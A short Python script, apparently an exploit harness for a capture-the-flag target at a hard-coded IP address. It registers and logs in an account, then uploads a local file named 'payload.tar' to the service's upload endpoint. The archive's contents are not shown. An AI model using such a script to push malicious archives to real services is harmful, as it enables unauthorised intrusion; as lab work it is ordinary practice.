import requests 

USERNAME = "normal1"
PASSWORD = "normal1"
ARCHIVE_NAME = "payload.tar"
BASE_URL = "http://94.237.48.12:31159"

def main():
    session = requests.Session()
    create_account(session)
    assert(login(session))
    assert(upload(session))
    # assert(get_test_text(session))

def create_account(session: requests.Session):
    data = {
        "username":USERNAME,
        "password":PASSWORD
    }
    resp = session.post(f"{BASE_URL}/register", data=data)
    if resp.ok:
        print(f"Successfully created user '{USERNAME}' with password '{PASSWORD}'")
        return True
    else:
        print(f"Error while creating account for user '{USERNAME}'")
        print(resp.text)
        print()
        return False

def login(session: requests.Session):
    data = {
        "username":USERNAME,
        "password":PASSWORD
    }
    resp = session.post(f"{BASE_URL}/login", data=data)
    if resp.ok:
        print(f"Successfully loggend in for user '{USERNAME}' with password '{PASSWORD}'")
        return True
    else:
        print(f"Error while loggin in for user '{USERNAME}'")
        print(resp.text)
        print()
        return False

def upload(session: requests.Session):
    files = {'archive': open(ARCHIVE_NAME, 'rb')}
    resp = session.post(f"{BASE_URL}/user/upload", files=files)
    if resp.ok:
        print(f"Successfully uploaded archive!")
        return True
    else:
        print(f"Error while uploading archive!")
        print(resp.text)
        print()
        return False

if __name__ == "__main__":
    main()